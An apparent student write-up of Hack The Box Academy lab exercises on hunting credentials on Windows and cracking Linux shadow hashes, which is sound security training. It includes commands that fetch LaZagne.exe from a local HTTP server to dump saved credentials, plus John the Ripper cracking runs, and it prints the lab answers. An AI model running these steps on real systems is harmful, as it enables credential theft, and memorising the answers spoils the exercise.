### Windows Credential Hunting Exercise
 
IP: 10.129.192.120
 
---
 
### Question 1:
What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)
 
### Question 2:
What is the GitLab access code Bob uses? (Format: Case-Sensitive)
 
### Question 3:
What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)
 
### Question 4:
What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)
 
### Question 5:
What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)
 
RDP'ing to the user with the given password.
 
```diff
+ $ xfreerdp /v:10.129.192.120 /u:bob /p:HTB_@cademy_stdnt!
```
 
I take a search around and see a few files of note, first of which being the WorkStuff folder containing a file named GitlabAccessCodeJustInCase, which inside contains the GitLab access code.
 
	3z1ePfGbjWPsTfCsZfjy
 
&#x1F6A9; found **3z1ePfGbjWPsTfCsZfjy** (Question 2).
 
Next there is a file inside of WorkStuff labeled Creds; inside is a password.ods, which contains the Switches via SSH password.
 
	WellConnected123
 
&#x1F6A9; found **WellConnected123** (Question 1).
 
Looking around some more, I can see a folder named AutomationAndScripts, inside of which is a BulkAddADusers. Reading this file, I can see the default password of every newly created Inlanefreight Domain user account.
 
	Inlanefreightisgreat2022
 
&#x1F6A9; found **Inlanefreightisgreat2022** (Question 4).
 
Alongside this script is an ansible folder, inside of which is the EdgeRouterConfigs, containing the credentials for the Edge-Router.
 
	edgeadmin:Edge@dmin123!
 
&#x1F6A9; found **edgeadmin:Edge@dmin123!** (Question 5).
 
Once I'm through all of the obvious files and folders, I transfer LaZagne.exe onto the victim machine and run all modules, which gives me the WinSCP login.
 
```diff
+ $ python3 -m http.server
+ PS C:\Users\bob> (New-Object Net.WebClient).DownloadFile('http://10.10.15.120:8000/LaZagne.exe', 'C:\Users\bob\LaZagne.exe')
+ CMD C:\Users\bob> start LaZagne.exe all
```
 
	<snip>
	[+] Password found !!!
	URL: 10.129.202.64
	Login: ubuntu
	Password: FSadmin123
	Port: 22
 
This shows me the login for WinSCP.
 
&#x1F6A9; found **ubuntu:FSadmin123** (Question 3).
 
---
 
### Linux Authentication Exercise
 
---
 
### Question 1:
Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?
 
### Question 2:
Use a wordlist attack to find sarah's password. What is it?
 
I start off by getting the attached file onto the machine with wget.
 
```diff
+ $ wget https://cdn.services-k8s.prod.aws.htb.systems/content/questions/file/ebdc603e-28a2-4cdf-a24b-571c097eae7a.zip
+ $ unzip ebdc603e-28a2-4cdf-a24b-571c097eae7a.zip
```
 
	Archive:  ebdc603e-28a2-4cdf-a24b-571c097eae7a.zip
	  inflating: passwd
	  inflating: shadow
 
Next I run the unshadow command to combine both the passwd and shadow file to be run by john.
 
```diff
+ $ unshadow passwd shadow > unshadowed.hashes
```
 
Since the questions only ask for two of the users' passwords, and there are only actually two passwords given in the file to crack while the others are empty, I'll just make them into their own separate files for separate cracking.
 
```diff
+ $ cat martinhash
+ $ cat sarahhash
```
 
	martin:$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh
	sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:1001:1001:Sarah Saragaday:/home/sarah:/usr/bin/bash
 
The question states to use single crack mode against martin's password, so I do just that.
 
```diff
+ $ john --single martinhash
```
 
	Using default input encoding: UTF-8
	Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
	Cost 1 (iteration count) is 5000 for all loaded hashes
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	Martin1          (martin)
	1g 0:00:00:00 DONE (2026-10-17 15:43) 6.666g/s 5293p/s 5293c/s 5293C/s martin}..Martinmartin1
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed.
 
&#x1F6A9; found **Martin1** (Question 1).
 
The other question asks to use a wordlist attack against sarah's password, so I do that.
 
```diff
+ $ john --wordlist=/usr/share/wordlists/rockyou.txt sarahhash
```
 
	Using default input encoding: UTF-8
	Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
	Cost 1 (iteration count) is 5000 for all loaded hashes
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	mariposa         (sarah)
	1g 0:00:00:00 DONE (2026-10-17 15:44) 11.11g/s 5688p/s 5688c/s 5688C/s 123456..letmein
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed.
 
&#x1F6A9; found **mariposa** (Question 2).
